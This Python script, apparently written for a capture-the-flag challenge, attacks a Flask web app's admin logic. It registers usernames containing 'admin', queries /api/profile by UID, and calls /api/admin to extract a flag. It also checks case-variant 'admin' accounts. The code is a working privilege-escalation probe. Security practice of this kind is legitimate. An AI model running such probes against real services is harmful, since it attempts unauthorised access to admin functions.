import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 管理员逻辑测试")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 注册包含 "admin" 的用户名
print("[*] 测试1: 注册包含 'admin' 的用户名")

admin_containing_users = [
    "myadmin",
    "testadmin",
    "adminuser",
    "useradmin",
    "123admin456",
]

for username in admin_containing_users:
    print(f"    [-] 注册: {username}")
    resp = session.post(f"{BASE_URL}/register", data={"username": username})
    if resp.status_code == 200:
        print(f"    [+] 注册成功!")
        uid_match = re.search(r'[a-f0-9]{32}', resp.text)
        if uid_match:
            uid = uid_match.group()
            print(f"    [+] UID: {uid}")
            
            # 检查角色
            profile_resp = session.post(f"{BASE_URL}/api/profile", 
                json={"uid": uid},
                headers={"Content-Type": "application/json"})
            print(f"    [+] Role: {profile_resp.text}")
            
            if '"role":"admin"' in profile_resp.text:
                print(f"    [!!!] 找到管理员!")
                
                # 访问 /api/admin
                admin_resp = session.post(f"{BASE_URL}/api/admin", 
                    json={"uid": uid},
                    headers={"Content-Type": "application/json"})
                print(f"    [!] POST /api/admin: {admin_resp.status_code}")
                print(f"    {admin_resp.text}")
                
                if "flag" in admin_resp.text.lower():
                    print(f"    [!!!] 发现 flag!")
                    flag_match = re.search(r'flag\{[^}]+\}', admin_resp.text, re.IGNORECASE)
                    if flag_match:
                        print(f"    [!!!] Flag: {flag_match.group()}")
                break
    elif resp.status_code == 400:
        print(f"    [-] 注册失败")

print()

# 测试2: 检查已注册用户的角色
print("[*] 测试2: 检查已注册用户的角色")

test_uids = [
    ("3553c1effa0b4698895a4874cfbd86d8", "ADMiN"),
    ("eb0ffb79891641d789c50970f64aa263", "aDMin"),
]

for uid, name in test_uids:
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"    [{name}] {uid}")
    print(f"        {profile_resp.text}")
    
    if '"role":"admin"' in profile_resp.text:
        print(f"        [!!!] 找到管理员!")

print()

print("[*] 测试完成")
